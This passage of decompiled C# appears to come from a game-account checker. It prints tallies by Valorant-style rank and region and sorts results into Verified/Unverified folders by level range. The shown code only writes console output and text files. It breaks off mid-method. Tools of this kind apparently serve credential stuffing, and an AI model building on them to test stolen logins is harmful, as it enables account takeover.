		System.Console.Write("]");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Immortal>>:           [");
		Checker.say2(Checker.immo);
		Colorful.Console.Write("]|[");
		Checker.say2(Checker.immou);
		System.Console.Write("]");
		Colorful.Console.WriteLine("");
		Checker.say("+");
		Utils.center2("Radiant>>:            [");
		Checker.say2(Checker.radiant);
		Colorful.Console.Write("]|[");
		Checker.say2(Checker.radiantu);
		System.Console.Write("]");
		Colorful.Console.WriteLine("");
		System.Console.WriteLine("");
		System.Console.WriteLine("");
		System.Console.WriteLine("");
		System.Console.Write("                                                                     ->  AP-[");
		Checker.say2(Checker.AP);
		System.Console.Write("]   ");
		System.Console.Write("NA-[");
		Checker.say2(Checker.NA);
		System.Console.Write("]   ");
		System.Console.Write("EU-[");
		Checker.say2(Checker.EU);
		System.Console.Write("]   ");
		System.Console.Write("KR-[");
		Checker.say2(Checker.KR);
		System.Console.Write("]  <-");
		System.Console.WriteLine("");
		GC.Collect();
		Thread.Sleep(2000);
	}

	// Token: 0x06000006 RID: 6 RVA: 0x00002058 File Offset: 0x00000258
	public static void say(string prefix)
	{
		Colorful.Console.Write(" ");
		Colorful.Console.Write("                                            {");
		Colorful.Console.Write(prefix, Color.PaleVioletRed);
		Colorful.Console.Write("} ");
	}

	// Token: 0x06000007 RID: 7 RVA: 0x00002088 File Offset: 0x00000288
	public static void say2(int prefix)
	{
		Colorful.Console.Write(prefix, Color.DeepSkyBlue);
	}

	// Token: 0x06000008 RID: 8 RVA: 0x00002096 File Offset: 0x00000296
	public static void say3(string prefix)
	{
		Colorful.Console.Write(prefix, Color.DeepSkyBlue);
	}

	// Token: 0x06000009 RID: 9 RVA: 0x000020A4 File Offset: 0x000002A4
	public static void nau10()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/NA/1-10");
	}

	// Token: 0x0600000A RID: 10 RVA: 0x000020C0 File Offset: 0x000002C0
	public static void nau20()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/NA/10-20");
	}

	// Token: 0x0600000B RID: 11 RVA: 0x000020DC File Offset: 0x000002DC
	public static void nau30()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/NA/20-30");
	}

	// Token: 0x0600000C RID: 12 RVA: 0x000020F8 File Offset: 0x000002F8
	public static void nau50()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/NA/30-50");
	}

	// Token: 0x0600000D RID: 13 RVA: 0x00002114 File Offset: 0x00000314
	public static void nau80()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/NA/50-80");
	}

	// Token: 0x0600000E RID: 14 RVA: 0x00002130 File Offset: 0x00000330
	public static void nau100()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/NA/80-100");
	}

	// Token: 0x0600000F RID: 15 RVA: 0x0000214C File Offset: 0x0000034C
	public static void nau150()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/NA/100-150");
	}

	// Token: 0x06000010 RID: 16 RVA: 0x00002168 File Offset: 0x00000368
	public static void nau200()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/NA/150-200");
	}

	// Token: 0x06000011 RID: 17 RVA: 0x00002184 File Offset: 0x00000384
	public static void nau250()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/NA/200++");
	}

	// Token: 0x06000012 RID: 18 RVA: 0x000021A0 File Offset: 0x000003A0
	public static void apu10()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/AP/1-10");
	}

	// Token: 0x06000013 RID: 19 RVA: 0x000021BC File Offset: 0x000003BC
	public static void apu20()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/AP/10-20");
	}

	// Token: 0x06000014 RID: 20 RVA: 0x000021D8 File Offset: 0x000003D8
	public static void apu30()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/AP/20-30");
	}

	// Token: 0x06000015 RID: 21 RVA: 0x000021F4 File Offset: 0x000003F4
	public static void apu50()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/AP/30-50");
	}

	// Token: 0x06000016 RID: 22 RVA: 0x00002210 File Offset: 0x00000410
	public static void apu80()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/AP/50-80");
	}

	// Token: 0x06000017 RID: 23 RVA: 0x0000222C File Offset: 0x0000042C
	public static void apu100()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/AP/80-100");
	}

	// Token: 0x06000018 RID: 24 RVA: 0x00002248 File Offset: 0x00000448
	public static void apu150()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/AP/100-150");
	}

	// Token: 0x06000019 RID: 25 RVA: 0x00002264 File Offset: 0x00000464
	public static void apu200()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/AP/150-200");
	}

	// Token: 0x0600001A RID: 26 RVA: 0x00002280 File Offset: 0x00000480
	public static void apu250()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/AP/200++");
	}

	// Token: 0x0600001B RID: 27 RVA: 0x0000229C File Offset: 0x0000049C
	public static void euu10()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/EU/1-10");
	}

	// Token: 0x0600001C RID: 28 RVA: 0x000022B8 File Offset: 0x000004B8
	public static void euu20()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/EU/10-20");
	}

	// Token: 0x0600001D RID: 29 RVA: 0x000022D4 File Offset: 0x000004D4
	public static void euu30()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/EU/20-30");
	}

	// Token: 0x0600001E RID: 30 RVA: 0x000022F0 File Offset: 0x000004F0
	public static void euu50()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/EU/30-50");
	}

	// Token: 0x0600001F RID: 31 RVA: 0x0000230C File Offset: 0x0000050C
	public static void euu80()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/EU/50-80");
	}

	// Token: 0x06000020 RID: 32 RVA: 0x00002328 File Offset: 0x00000528
	public static void euu100()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/EU/80-100");
	}

	// Token: 0x06000021 RID: 33 RVA: 0x00002344 File Offset: 0x00000544
	public static void euu150()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/EU/100-150");
	}

	// Token: 0x06000022 RID: 34 RVA: 0x00002360 File Offset: 0x00000560
	public static void euu200()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/EU/150-200");
	}

	// Token: 0x06000023 RID: 35 RVA: 0x0000237C File Offset: 0x0000057C
	public static void euu250()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/EU/200++");
	}

	// Token: 0x06000024 RID: 36 RVA: 0x00002398 File Offset: 0x00000598
	public static void kru10()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/KR/1-10");
	}

	// Token: 0x06000025 RID: 37 RVA: 0x000023B4 File Offset: 0x000005B4
	public static void kru20()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/KR/10-20");
	}

	// Token: 0x06000026 RID: 38 RVA: 0x000023D0 File Offset: 0x000005D0
	public static void kru30()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/KR/20-30");
	}

	// Token: 0x06000027 RID: 39 RVA: 0x000023EC File Offset: 0x000005EC
	public static void kru50()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/KR/30-50");
	}

	// Token: 0x06000028 RID: 40 RVA: 0x00002408 File Offset: 0x00000608
	public static void kru80()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/KR/50-80");
	}

	// Token: 0x06000029 RID: 41 RVA: 0x00002424 File Offset: 0x00000624
	public static void kru100()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/KR/80-100");
	}

	// Token: 0x0600002A RID: 42 RVA: 0x00002440 File Offset: 0x00000640
	public static void kru150()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/KR/100-150");
	}

	// Token: 0x0600002B RID: 43 RVA: 0x0000245C File Offset: 0x0000065C
	public static void kru200()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/KR/150-200");
	}

	// Token: 0x0600002C RID: 44 RVA: 0x00002478 File Offset: 0x00000678
	public static void kru250()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/KR/200++");
	}

	// Token: 0x0600002D RID: 45 RVA: 0x00002494 File Offset: 0x00000694
	public static void nav10()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/NA/1-10");
	}

	// Token: 0x0600002E RID: 46 RVA: 0x000024B0 File Offset: 0x000006B0
	public static void nav20()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/NA/10-20");
	}

	// Token: 0x0600002F RID: 47 RVA: 0x000024CC File Offset: 0x000006CC
	public static void nav30()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/NA/20-30");
	}

	// Token: 0x06000030 RID: 48 RVA: 0x000024E8 File Offset: 0x000006E8
	public static void nav50()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/NA/30-50");
	}

	// Token: 0x06000031 RID: 49 RVA: 0x00002504 File Offset: 0x00000704
	public static void nav80()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/NA/50-80");
	}

	// Token: 0x06000032 RID: 50 RVA: 0x00002520 File Offset: 0x00000720
	public static void nav100()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/NA/80-100");
	}

	// Token: 0x06000033 RID: 51 RVA: 0x0000253C File Offset: 0x0000073C
	public static void nav150()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/NA/100-150");
	}

	// Token: 0x06000034 RID: 52 RVA: 0x00002558 File Offset: 0x00000758
	public static void nav200()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/NA/150-200");
	}

	// Token: 0x06000035 RID: 53 RVA: 0x00002574 File Offset: 0x00000774
	public static void nav250()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/NA/200++");
	}

	// Token: 0x06000036 RID: 54 RVA: 0x00002590 File Offset: 0x00000790
	public static void apv10()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/AP/1-10");
	}

	// Token: 0x06000037 RID: 55 RVA: 0x000025AC File Offset: 0x000007AC
	public static void apv20()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/AP/10-20");
	}

	// Token: 0x06000038 RID: 56 RVA: 0x000025C8 File Offset: 0x000007C8
	public static void apv30()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/AP/20-30");
	}

	// Token: 0x06000039 RID: 57 RVA: 0x000025E4 File Offset: 0x000007E4
	public static void apv50()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/AP/30-50");
	}

	// Token: 0x0600003A RID: 58 RVA: 0x00002600 File Offset: 0x00000800
	public static void apv80()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/AP/50-80");
	}

	// Token: 0x0600003B RID: 59 RVA: 0x0000261C File Offset: 0x0000081C
	public static void apv100()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/AP/80-100");
	}

	// Token: 0x0600003C RID: 60 RVA: 0x00002638 File Offset: 0x00000838
	public static void apv150()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/AP/100-150");
	}

	// Token: 0x0600003D RID: 61 RVA: 0x00002654 File Offset: 0x00000854
	public static void apv200()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/AP/150-200");
	}

	// Token: 0x0600003E RID: 62 RVA: 0x00002670 File Offset: 0x00000870
	public static void apv250()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/AP/200++");
	}

	// Token: 0x0600003F RID: 63 RVA: 0x0000268C File Offset: 0x0000088C
	public static void euv10()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/EU/1-10");
	}

	// Token: 0x06000040 RID: 64 RVA: 0x000026A8 File Offset: 0x000008A8
	public static void euv20()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/EU/10-20");
	}

	// Token: 0x06000041 RID: 65 RVA: 0x000026C4 File Offset: 0x000008C4
	public static void euv30()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/EU/20-30");
	}

	// Token: 0x06000042 RID: 66 RVA: 0x000026E0 File Offset: 0x000008E0
	public static void euv50()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/EU/30-50");
	}

	// Token: 0x06000043 RID: 67 RVA: 0x000026FC File Offset: 0x000008FC
	public static void euv80()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/EU/50-80");
	}

	// Token: 0x06000044 RID: 68 RVA: 0x00002718 File Offset: 0x00000918
	public static void euv100()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/EU/80-100");
	}

	// Token: 0x06000045 RID: 69 RVA: 0x00002734 File Offset: 0x00000934
	public static void euv150()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/EU/100-150");
	}

	// Token: 0x06000046 RID: 70 RVA: 0x00002750 File Offset: 0x00000950
	public static void euv200()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/EU/150-200");
	}

	// Token: 0x06000047 RID: 71 RVA: 0x0000276C File Offset: 0x0000096C
	public static void euv250()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/EU/200++");
	}

	// Token: 0x06000048 RID: 72 RVA: 0x00002788 File Offset: 0x00000988
	public static void krv10()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/KR/1-10");
	}

	// Token: 0x06000049 RID: 73 RVA: 0x000027A4 File Offset: 0x000009A4
	public static void krv20()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/KR/10-20");
	}

	// Token: 0x0600004A RID: 74 RVA: 0x000027C0 File Offset: 0x000009C0
	public static void krv30()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/KR/20-30");
	}

	// Token: 0x0600004B RID: 75 RVA: 0x000027DC File Offset: 0x000009DC
	public static void krv50()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/KR/30-50");
	}

	// Token: 0x0600004C RID: 76 RVA: 0x000027F8 File Offset: 0x000009F8
	public static void krv80()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/KR/50-80");
	}

	// Token: 0x0600004D RID: 77 RVA: 0x00002814 File Offset: 0x00000A14
	public static void krv100()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/KR/80-100");
	}

	// Token: 0x0600004E RID: 78 RVA: 0x00002830 File Offset: 0x00000A30
	public static void krv150()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/KR/100-150");
	}

	// Token: 0x0600004F RID: 79 RVA: 0x0000284C File Offset: 0x00000A4C
	public static void krv200()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/KR/150-200");
	}

	// Token: 0x06000050 RID: 80 RVA: 0x00002868 File Offset: 0x00000A68
	public static void krv250()
	{
		Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/KR/200++");
	}

	// Token: 0x06000051 RID: 81 RVA: 0x00007C2C File Offset: 0x00005E2C
	private static void nas10(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/NA/1-10/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000052 RID: 82 RVA: 0x00007CA8 File Offset: 0x00005EA8
	private static void nas20(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/NA/10-20/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000053 RID: 83 RVA: 0x00007D24 File Offset: 0x00005F24
	private static void nas30(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/NA/20-30/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000054 RID: 84 RVA: 0x00007DA0 File Offset: 0x00005FA0
	private static void nas50(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/NA/30-50/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000055 RID: 85 RVA: 0x00007E1C File Offset: 0x0000601C
	private static void nas80(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/NA/50-80/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000056 RID: 86 RVA: 0x00007E98 File Offset: 0x00006098
	private static void nas100(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/NA/80-100/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000057 RID: 87 RVA: 0x00007F14 File Offset: 0x00006114
	private static void nas150(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/NA/100-150/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000058 RID: 88 RVA: 0x00007F90 File Offset: 0x00006190
	private static void nas200(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/NA/150-200/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000059 RID: 89 RVA: 0x0000800C File Offset: 0x0000620C
	private static void nas2000(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/NA/200++/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600005A RID: 90 RVA: 0x00008088 File Offset: 0x00006288
	private static void apb10(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/AP/1-10/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600005B RID: 91 RVA: 0x00008104 File Offset: 0x00006304
	private static void apb20(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/AP/10-20/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600005C RID: 92 RVA: 0x00008180 File Offset: 0x00006380
	private static void apb30(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/AP/20-30/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600005D RID: 93 RVA: 0x000081FC File Offset: 0x000063FC
	private static void apb50(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/AP/30-50/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600005E RID: 94 RVA: 0x00008278 File Offset: 0x00006478
	private static void apb80(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/AP/50-80/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600005F RID: 95 RVA: 0x000082F4 File Offset: 0x000064F4
	private static void apb100(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/AP/80-100/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000060 RID: 96 RVA: 0x00008370 File Offset: 0x00006570
	private static void apb150(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/AP/100-150/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000061 RID: 97 RVA: 0x000083EC File Offset: 0x000065EC
	private static void apb200(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/AP/150-200/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000062 RID: 98 RVA: 0x00008468 File Offset: 0x00006668
	private static void apb2000(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/AP/200++/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000063 RID: 99 RVA: 0x000084E4 File Offset: 0x000066E4
	private static void eub10(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/EU/1-10/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000064 RID: 100 RVA: 0x00008560 File Offset: 0x00006760
	private static void eub20(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/EU/10-20/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000065 RID: 101 RVA: 0x000085DC File Offset: 0x000067DC
	private static void eub30(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/EU/20-30/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000066 RID: 102 RVA: 0x00008658 File Offset: 0x00006858
	private static void eub50(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/EU/30-50/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000067 RID: 103 RVA: 0x000086D4 File Offset: 0x000068D4
	private static void eub80(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/EU/50-80/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000068 RID: 104 RVA: 0x00008750 File Offset: 0x00006950
	private static void eub100(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/EU/80-100/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000069 RID: 105 RVA: 0x000087CC File Offset: 0x000069CC
	private static void eub150(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/EU/100-150/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600006A RID: 106 RVA: 0x00008848 File Offset: 0x00006A48
	private static void eub200(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/EU/150-200/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600006B RID: 107 RVA: 0x000088C4 File Offset: 0x00006AC4
	private static void eub2000(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/EU/200++/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600006C RID: 108 RVA: 0x00008940 File Offset: 0x00006B40
	private static void krb10(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/KR/1-10/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600006D RID: 109 RVA: 0x000089BC File Offset: 0x00006BBC
	private static void krb20(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/KR/10-20/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600006E RID: 110 RVA: 0x00008A38 File Offset: 0x00006C38
	private static void krb30(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/KR/20-30/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600006F RID: 111 RVA: 0x00008AB4 File Offset: 0x00006CB4
	private static void krb50(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/KR/30-50/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000070 RID: 112 RVA: 0x00008B30 File Offset: 0x00006D30
	private static void krb80(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/KR/50-80/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000071 RID: 113 RVA: 0x00008BAC File Offset: 0x00006DAC
	private static void krb100(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/KR/80-100/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000072 RID: 114 RVA: 0x00008C28 File Offset: 0x00006E28
	private static void krb150(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/KR/100-150/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000073 RID: 115 RVA: 0x00008CA4 File Offset: 0x00006EA4
	private static void krb200(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/KR/150-200/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000074 RID: 116 RVA: 0x00008D20 File Offset: 0x00006F20
	private static void krb2000(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Unverified/KR/200++/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000075 RID: 117 RVA: 0x00008D9C File Offset: 0x00006F9C
	private static void nac10(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/NA/1-10/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000076 RID: 118 RVA: 0x00008E18 File Offset: 0x00007018
	private static void nac20(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
